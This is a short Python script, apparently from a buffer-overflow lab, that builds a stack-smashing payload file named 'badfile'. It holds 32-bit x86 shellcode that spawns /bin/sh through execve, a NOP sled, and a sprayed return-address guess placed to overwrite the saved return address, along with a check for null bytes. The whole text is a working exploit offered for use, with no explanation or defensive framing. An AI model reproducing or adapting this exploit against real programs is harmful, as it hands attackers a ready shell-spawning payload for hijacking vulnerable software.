import sys

shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

content = bytearray(0x90 for i in range(528))

# putting the shellcode at the ending phase of the space between buffer and return address field
content[400 - len(shellcode) : 400] = shellcode

# and setting the return address at early phase of the space
ret = 0xffffd268 - 750
print(format(ret, '#x'))
for start in range(452, 508, 4):
	content[start : start + 4] = (ret).to_bytes(4, byteorder='little')

for i in range(len(content)):
	if (content[i] == 0x00):
		print('no', i, content[i])

with open('badfile', 'wb') as f:
	f.write(content)
